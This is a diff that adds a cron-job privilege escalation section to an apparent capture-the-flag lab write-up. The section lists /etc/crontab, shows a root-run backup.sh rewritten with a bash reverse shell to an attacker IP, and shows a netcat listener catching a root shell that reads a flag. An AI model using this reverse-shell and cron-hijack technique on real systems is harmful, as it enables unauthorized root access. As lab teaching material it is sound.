@@ -141,3 +141,78 @@ THM-X
 ```
 
 Because the binary executes with the file owner's privileges (root), it allows us to read files that are normally inaccessible.
+
+# Privilege Escalation: Cron Jobs
+
+CRON is a time-based job scheduler in Unix/Linux systems that automatically runs commands or scripts at specified times or intervals.
+
+We can check which files are executed by cron using:
+
+```
+cat /etc/crontab
+```
+
+Example output:
+
+```
+$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+```
+
+We can see that /home/karen/backup.sh is executed every minute as root.
+
+If we have write permissions to this file, we can modify it and achieve privilege escalation.
+
+Target script:
+
+```
+$ cat /home/karen/backup.sh
+#!/bin/bash
+
+bash -i >& /dev/tcp/192.168.134.207/6666 0>&1
+$ chmod +x /home/karen/backup.sh
+```
+
+Here, we modified the script to initiate a reverse shell. Since cron runs it as root every minute, the reverse shell will also execute with root privileges.
+
+Now we start a listener on our attacking machine:
+
+```
+$ nc -nvlp 6666
+Listening on 0.0.0.0 6666
+Connection received on 10.67.141.102 56760
+bash: cannot set terminal process group (12509): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ip-10-67-141-102:~# cat /home/ubuntu/flag5.txt
+cat /home/ubuntu/flag5.txt
+THM-X
+```
+
+After the cron job executes, we receive a reverse shell as root.
+
+
